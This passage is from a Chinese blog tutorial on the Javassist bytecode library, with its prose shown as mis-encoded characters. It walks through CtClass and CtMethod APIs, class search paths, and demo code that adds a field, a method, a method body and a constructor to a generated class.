æ·»åŠ æ¥å£</span><br>ctClass.addInterface(...);<br><span class="hljs-comment">// æ·»åŠ æ„é€ å™¨</span><br>ctClass.addConstructor(...);<br><span class="hljs-comment">// æ·»åŠ å­—æ®µ</span><br>ctClass.addField(...);<br><span class="hljs-comment">// æ·»åŠ æ–¹æ³•</span><br>ctClass.addMethod(...);<br></code></pre></td></tr></table></figure><h2 id="ctclassç¼–è¯‘"><a href="#CtClassç¼–è¯‘" class="headerlink" title="CtClassç¼–è¯‘"></a>CtClassç¼–è¯‘</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å–å­—èŠ‚ç æ–‡ä»¶ éœ€è¦æ³¨æ„çš„æ˜¯ä¸€æ—¦è°ƒç”¨è¯¥æ–¹æ³•ï¼Œåˆ™æ— æ³•ç»§ç»­ä¿®æ”¹å·²ç»è¢«åŠ è½½çš„class</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> ctClass.toClass();<br><span class="hljs-comment">// ç±»çš„å­—èŠ‚ç æ–‡ä»¶</span><br><span class="hljs-type">ClassFile</span> <span class="hljs-variable">classFile</span> <span class="hljs-operator">=</span> ctClass.getClassFile();<br><span class="hljs-comment">// ç¼–è¯‘æˆå­—èŠ‚ç æ–‡ä»¶, ä½¿ç”¨å½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨åŠ è½½ç±», å¦‚æœç±»å·²å­˜åœ¨æˆ–è€…ç¼–è¯‘å¤±è´¥å°†æŠ›å‡ºå¼‚å¸¸</span><br><span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br></code></pre></td></tr></table></figure><h1 id="ctmethodç›¸å…³æ–¹æ³•"><a href="#CtMethodç›¸å…³æ–¹æ³•" class="headerlink" title="CtMethodç›¸å…³æ–¹æ³•"></a>CtMethodç›¸å…³æ–¹æ³•</h1><p><code>CtMthod</code>ä»£è¡¨ç±»ä¸­çš„æŸä¸ªæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡<code>CtClass</code>æä¾›çš„APIè·å–æˆ–è€…<code>CtNewMethod</code>æ–°å»ºï¼Œé€šè¿‡<code>CtMethod</code>å¯¹è±¡å¯ä»¥å®ç°å¯¹æ–¹æ³•çš„ä¿®æ”¹ã€‚</p><p>CtNewMethodæœ‰ç‚¹ç±»ä¼¼ä¸€ä¸ªå·¥å…·ç±»ï¼Œé‡Œé¢çš„æ–¹æ³•éƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œæ¯”å¦‚ç”Ÿæˆä¸€ä¸ªæ–°çš„CtMethod</p><p><img src="https://cdn.clown2024.cn/202409060034713.png" alt="image-20240906003402632"></p><ul><li><p>insertBefore : åœ¨æ–¹æ³•çš„èµ·å§‹ä½ç½®æ’å…¥ä»£ç ï¼›</p></li><li><p>insterAfter : åœ¨æ–¹æ³•çš„æ‰€æœ‰ return è¯­å¥å‰æ’å…¥ä»£ç ä»¥ç¡®ä¿è¯­å¥èƒ½å¤Ÿè¢«æ‰§è¡Œï¼Œé™¤éé‡åˆ°exceptionï¼›</p></li><li><p>insertAt : åœ¨æŒ‡å®šçš„ä½ç½®æ’å…¥ä»£ç ï¼›</p></li><li><p>setBody: å°†æ–¹æ³•çš„å†…å®¹è®¾ç½®ä¸ºè¦å†™å…¥çš„ä»£ç ï¼Œå½“æ–¹æ³•è¢« abstractä¿®é¥°æ—¶ï¼Œè¯¥ä¿®é¥°ç¬¦è¢«ç§»é™¤ï¼›</p></li><li><p>make : åˆ›å»ºä¸€ä¸ªæ–°çš„æ–¹æ³•ï¼Œæœ¬è´¨å°±æ˜¯è°ƒç”¨CtNewMethod#make</p><p><img src="https://cdn.clown2024.cn/202409060035377.png" alt="image-20240906003533328"></p></li></ul><h2 id="ctmethodå±æ€§è·å–"><a href="#CtMethodå±æ€§è·å–" class="headerlink" title="CtMethodå±æ€§è·å–"></a>CtMethodå±æ€§è·å–</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass5</span> <span class="hljs-operator">=</span> pool.get(TestService.class.getName());<br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass5.getDeclaredMethod(<span class="hljs-string">&quot;selectOrder&quot;</span>);<br><span class="hljs-comment">// æ–¹æ³•å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> ctMethod.getName();<br><span class="hljs-comment">// è¿”å›ç±»å‹</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">returnType</span> <span class="hljs-operator">=</span> ctMethod.getReturnType();<br><span class="hljs-comment">// æ–¹æ³•å‚æ•°, é€šè¿‡æ­¤ç§æ–¹å¼å¾—åˆ°æ–¹æ³•å‚æ•°åˆ—è¡¨</span><br><span class="hljs-comment">// æ ¼å¼: com.kawa.TestService.getOrder(java.lang.String,java.util.List)</span><br>ctMethod.getLongName();<br><span class="hljs-comment">// æ–¹æ³•ç­¾å æ ¼å¼: (Ljava/lang/String;Ljava/util/List;Lcom/test/Order;)Ljava/lang/Integer;</span><br>ctMethod.getSignature();<br><br><span class="hljs-comment">// è·å–æ–¹æ³•å‚æ•°åç§°, å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼å¾—åˆ°æ–¹æ³•çœŸå®å‚æ•°åç§°</span><br>List&lt;String&gt; argKeys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><span class="hljs-type">MethodInfo</span> <span class="hljs-variable">methodInfo</span> <span class="hljs-operator">=</span> ctMethod.getMethodInfo();<br><span class="hljs-type">CodeAttribute</span> <span class="hljs-variable">codeAttribute</span> <span class="hljs-operator">=</span> methodInfo.getCodeAttribute();<br><span class="hljs-type">LocalVariableAttribute</span> <span class="hljs-variable">attr</span> <span class="hljs-operator">=</span> (LocalVariableAttribute) codeAttribute.getAttribute(LocalVariableAttribute.tag);<br><span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> ctMethod.getParameterTypes().length;<br><span class="hljs-comment">// éé™æ€çš„æˆå‘˜å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯this</span><br><span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> Modifier.isStatic(ctMethod.getModifiers()) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> pos; i &lt; len; i++) &#123;<br>    argKeys.add(attr.variableName(i));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ctmethodæ–¹æ³•ä½“ä¿®æ”¹"><a href="#CtMethodæ–¹æ³•ä½“ä¿®æ”¹" class="headerlink" title="CtMethodæ–¹æ³•ä½“ä¿®æ”¹"></a>CtMethodæ–¹æ³•ä½“ä¿®æ”¹</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åœ¨æ–¹æ³•ä½“å‰æ’å…¥ä»£ç å—</span><br>ctMethod.insertBefore(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// åœ¨æ–¹æ³•ä½“åæ’å…¥ä»£ç å—</span><br>ctMethod.insertAfter(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// åœ¨æŸè¡Œ å­—èŠ‚ç  åæ’å…¥ä»£ç å—</span><br>ctMethod.insertAt(<span class="hljs-number">10</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// æ·»åŠ å‚æ•°</span><br>ctMethod.addParameter(CtClass);<br><span class="hljs-comment">// è®¾ç½®æ–¹æ³•å</span><br>ctMethod.setName(<span class="hljs-string">&quot;newName&quot;</span>);<br><span class="hljs-comment">// è®¾ç½®æ–¹æ³•ä½“ $0=this / $1,$2,$3... ä»£è¡¨æ–¹æ³•å‚æ•°</span><br>ctMethod.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<br><span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„æ–¹æ³•</span><br>ctMethod.make(<span class="hljs-string">&quot;kawa&quot;</span>,CtClass);<br></code></pre></td></tr></table></figure><h2 id="å¼‚å¸¸å—æ·»åŠ "><a href="#å¼‚å¸¸å—æ·»åŠ " class="headerlink" title="å¼‚å¸¸å—æ·»åŠ "></a>å¼‚å¸¸å—æ·»åŠ </h2><p>åœ¨æ–¹æ³•ä¸­åŠ å…¥try catchå—, éœ€è¦æ³¨æ„çš„æ˜¯, å¿…é¡»åœ¨æ’å…¥çš„ä»£ç ä¸­, åŠ å…¥returnå€¼$eä»£è¡¨å¼‚å¸¸ä¿¡æ¯.æ’å…¥çš„ä»£ç ç‰‡æ®µå¿…é¡»ä»¥throwæˆ–returnè¯­å¥ç»“æŸ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ...;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">etype</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;java.io.IOException&quot;</span>);<br>m.addCatch(<span class="hljs-string">&quot;&#123; System.out.println($e); throw $e; &#125;&quot;</span>, etype);<br><span class="hljs-comment">// ç­‰åŒäºæ·»åŠ å¦‚ä¸‹ä»£ç : </span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// the original method body</span><br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    System.out.println(e);<br>    <span class="hljs-keyword">throw</span> e;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç±»æœç´¢è·¯å¾„"><a href="#ç±»æœç´¢è·¯å¾„" class="headerlink" title="ç±»æœç´¢è·¯å¾„"></a>ç±»æœç´¢è·¯å¾„</h1><p>æˆ‘ä»¬å‰é¢è·å–çš„ClassPoolä»–æœ‰è‡ªå·±çš„ç±»æœç´¢è·¯å¾„ï¼Œå¦‚æœç¨‹åºè¿è¡Œåœ¨JBossæˆ–Tomcatç­‰webæœåŠ¡å™¨ä¸Šï¼Œå¯èƒ½ä¼šæ‰¾ä¸åˆ°ç”¨æˆ·è‡ªå·±çš„ç±»ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªç±»æœç´¢è·¯å¾„ã€‚</p><p>ä¸‹é¢æ˜¯å„ç§æ·»åŠ ç±»æœç´ è·¯å¾„çš„å„ç§æ–¹å¼</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*é€šè¿‡ClassClassPathæ·»åŠ è·¯å¾„*/</span><br><span class="hljs-comment">// å°†classpathæ’å…¥åˆ°æŒ‡å®šclasspathä¹‹å‰</span><br>pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Student.getClass()));<br><span class="hljs-comment">// å°†classpathæ·»åŠ åˆ°æŒ‡å®šclasspathä¹‹å</span><br>pool.appendClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(<span class="hljs-built_in">this</span>.getClass()));<br></code></pre></td></tr></table></figure><blockquote><p>è¯¥æ–¹å¼æ·»åŠ çš„æ—¶å€™ï¼Œæ¯”å¦‚ä¸Šé¢çš„Student.classï¼Œå¯ä»¥å°†classæ‰€åœ¨çš„æ•´ä¸ªjaræ·»åŠ åˆ°æœç´¢è·¯å¾„</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*æŒ‡å®šç›®å½•æ·»åŠ æœç´¢è·¯å¾„*/</span><br><span class="hljs-comment">// å°†ä¸€ä¸ªç›®å½•ä½œä¸ºclasspath</span><br>pool.insertClassPath(<span class="hljs-string">&quot;/xxx/lib&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*é€šè¿‡urlæŒ‡å®šæœç´¢è·¯å¾„*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">ClassPath</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassPath</span>(<span class="hljs-string">&quot;www.sample.com&quot;</span>, <span class="hljs-number">80</span>, <span class="hljs-string">&quot;/out/&quot;</span>, <span class="hljs-string">&quot;com.test&quot;</span>);<br>pool.insertClassPath(cp);<br></code></pre></td></tr></table></figure><blockquote><p>ä¸Šè¿°ä»£ç å°†<a href="http://www.sample.com/out%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%B1%BB%E6%90%9C%E7%B4%A2%E8%B7%AF%E5%BE%84%E3%80%82%E5%B9%B6%E4%B8%94%E8%BF%99%E4%B8%AAURL%E5%8F%AA%E8%83%BD%E6%90%9C%E7%B4%A2%60com.test%60%E5%8C%85%E9%87%8C%E9%9D%A2%E7%9A%84%E7%B1%BB%E3%80%82">http://www.sample.com:80/outæ·»åŠ åˆ°ç±»æœç´¢è·¯å¾„ã€‚å¹¶ä¸”è¿™ä¸ªURLåªèƒ½æœç´¢`com.test`åŒ…é‡Œé¢çš„ç±»ã€‚</a></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*é€šè¿‡ByteArrayPathæ·»åŠ æœç´¢è·¯å¾„*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">byte</span>[] buf = å­—èŠ‚æ•°ç»„;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> ç±»å;<br>cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayClassPath</span>(name, buf));<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.get(name);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*é€šè¿‡è¾“å…¥æµåŠ è½½class*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span>  classæ–‡ä»¶å¯¹åº”çš„è¾“å…¥æµ;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.makeClass(ins);<br></code></pre></td></tr></table></figure><h1 id="è¯»å†™å­—èŠ‚ç "><a href="#è¯»å†™å­—èŠ‚ç " class="headerlink" title="è¯»å†™å­—èŠ‚ç "></a>è¯»å†™å­—èŠ‚ç </h1><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;test.Rectangle&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p><code>ClassPool</code>çš„<code>getDefault()</code>æ–¹æ³•å°†ä¼šæŸ¥æ‰¾ç³»ç»Ÿé»˜è®¤çš„è·¯å¾„æ¥æœç´¢<code>test.Rectable</code>å¯¹è±¡ï¼Œç„¶åå°†è·å–åˆ°çš„<code>CtClass</code>å¯¹è±¡èµ‹å€¼ç»™ccå˜é‡ï¼Œå¦‚æœå¯¹è±¡æ²¡æœ‰è¢«æ‰¾åˆ°ï¼Œé‚£ä¹ˆ<code>get()</code>æ–¹æ³•å°±ä¼šåˆ›å»ºå‡ºä¸€ä¸ªé»˜è®¤çš„<code>CtClass</code>å¯¹è±¡ï¼Œç„¶åæ”¾å…¥åˆ°<code>HashTable</code>ä¸­ï¼ŒåŒæ—¶å°†å½“å‰åˆ›å»ºçš„å¯¹è±¡è¿”å›ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] b = cc.toBytecode(); <span class="hljs-comment">//ç›´æ¥è·å–å­—èŠ‚ç </span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cc.toClass(); <span class="hljs-comment">//è·å–Class</span><br></code></pre></td></tr></table></figure><p><code>toClass()</code>æ–¹æ³•è°ƒç”¨ä½¿å¾—å½“å‰çº¿ç¨‹ä¸­çš„context class loaderåŠ è½½æ­¤CtClassç±»ï¼Œç„¶åç”Ÿæˆ<code>java.lang.Class</code>å¯¹è±¡ã€‚</p><h1 id="å¯¹ç±»çš„ç›¸å…³æ“ä½œ"><a href="#å¯¹ç±»çš„ç›¸å…³æ“ä½œ" class="headerlink" title="å¯¹ç±»çš„ç›¸å…³æ“ä½œ"></a>å¯¹ç±»çš„ç›¸å…³æ“ä½œ</h1><p>ä¸»è¦è¿˜æ˜¯å­¦ä¸€ä¸‹å…·ä½“çš„ä½¿ç”¨ï¼Œå¤ªæ·±å…¥çš„ä¸œè¥¿å…ˆä¸çœ‹ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/weixin_54902210/article/details/129562446">https://blog.csdn.net/weixin_54902210/article/details/129562446</a></p><p>è¿™é‡ŒåŸºäºå‰é¢åˆ›å»ºçš„Helloç±»è¿›è¡Œæ“ä½œ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><h2 id="æ·»åŠ å±æ€§"><a href="#æ·»åŠ å±æ€§" class="headerlink" title="æ·»åŠ å±æ€§"></a>æ·»åŠ å±æ€§</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtField;<br><span class="hljs-keyword">import</span> javassist.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.åˆ›å»ºHelloç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.æ·»åŠ å±æ€§</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®å±æ€§ä¸ºpublic</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//ç»™nameå˜é‡åˆå§‹åŒ–å€¼Sentiment</span><br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071630618.png" alt="image-20240907163059547"></p><p>èµ‹å€¼ä¹Ÿå¯ä»¥è¿™æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ctClass.addField(name,<span class="hljs-string">&quot;name=\&quot;Sentiment\&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><p>ä½†è¿™ç§èµ‹å€¼åå‘äºç”¨æ„é€ å™¨ç­‰è¿›è¡Œåˆå§‹åŒ–</p><h2 id="æ·»åŠ æ–¹æ³•"><a href="#æ·»åŠ æ–¹æ³•" class="headerlink" title="æ·»åŠ æ–¹æ³•"></a>æ·»åŠ æ–¹æ³•</h2><p>æ–¹æ³•å¯ä»¥è®¾ç½®çš„è¿”å›ç±»å‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass booleanType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass charType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass byteType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass shortType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass intType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass longType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass floatType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass doubleType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass voidType;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸æ”¯æŒç›´æ¥ç”¨Stringï¼Œæ˜¯å› ä¸ºåœ¨javaå­—èŠ‚ç ä¸­ï¼Œå‚æ•°å’Œè¿”å›ç±»å‹çš„Stringä¸€èˆ¬éƒ½æ˜¯ç”¨å¸¸é‡æ± ä¸­å­—ç¬¦ä¸²çš„ç´¢å¼•å€¼ï¼Œè¦è®¾ç½®Stringç±»å‹çš„è¯å°±å’Œå‰é¢ä¸€æ ·ç”¨<strong>classPool.getCtClass(â€œjava.lang.Stringâ€)</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.åˆ›å»ºHelloç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.æ·»åŠ å±æ€§</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®å±æ€§ä¸ºpublic</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//ç»™nameå˜é‡åˆå§‹åŒ–å€¼Sentiment</span><br><br>        <span class="hljs-comment">//3.æ·»åŠ æ–¹æ³•</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//åˆ†åˆ«æ˜¯è¿”å›ç±»å‹ï¼Œæ–¹æ³•åï¼Œæ–¹æ³•å‚æ•°ï¼Œè¦æ·»åŠ çš„æ–¹æ³•çš„CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä¸ºpublic</span><br>        ctClass.addMethod(test);<br>        ctClass.writeFile();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071700312.png" alt="image-20240907170022235"></p><h3 id="è®¾ç½®æ–¹æ³•ä½“"><a href="#è®¾ç½®æ–¹æ³•ä½“" class="headerlink" title="è®¾ç½®æ–¹æ³•ä½“"></a>è®¾ç½®æ–¹æ³•ä½“</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.åˆ›å»ºHelloç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.æ·»åŠ å±æ€§</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®å±æ€§ä¸ºpublic</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//ç»™nameå˜é‡åˆå§‹åŒ–å€¼Sentiment</span><br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//3.æ·»åŠ æ–¹æ³•</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//åˆ†åˆ«æ˜¯è¿”å›ç±»å‹ï¼Œæ–¹æ³•åï¼Œæ–¹æ³•å‚æ•°ï¼Œè¦æ·»åŠ çš„æ–¹æ³•çš„CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä¸ºpublic</span><br>        ctClass.addMethod(test);<br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//4.è®¾ç½®æ–¹æ³•ä½“</span><br>        test.setBody(<span class="hljs-string">&quot;System.out.println(\&quot;Hello World\&quot;);&quot;</span>);<br>        ctClass.writeFile();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071702140.png" alt="image-20240907170209069"></p><h3 id="æ–¹æ³•ä½“å‰åæ’å…¥ä»£ç "><a href="#æ–¹æ³•ä½“å‰åæ’å…¥ä»£ç " class="headerlink" title="æ–¹æ³•ä½“å‰åæ’å…¥ä»£ç "></a>æ–¹æ³•ä½“å‰åæ’å…¥ä»£ç </h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">test.insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;æˆ‘åœ¨å‰é¢æ’å…¥:\&quot;+$1);&quot;</span>);<br>test.insertAfter(<span class="hljs-string">&quot;System.out.println(\&quot;æˆ‘åœ¨åé¢æ’å…¥äº†:\&quot;+$2);&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071704977.png" alt="image-20240907170453863"></p><h2 id="æ·»åŠ æ„é€ å™¨"><a href="#æ·»åŠ æ„é€ å™¨" class="headerlink" title="æ·»åŠ æ„é€ å™¨"></a>æ·»åŠ æ„é€ å™¨</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtConstructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;classPool.getCtClass(<span class="hljs-string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);<span class="hljs-comment">//åˆ†åˆ«æ˜¯å‚æ•°åˆ—è¡¨ï¼Œè¦æ·»åŠ çš„CtClass</span><br>cons.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<span 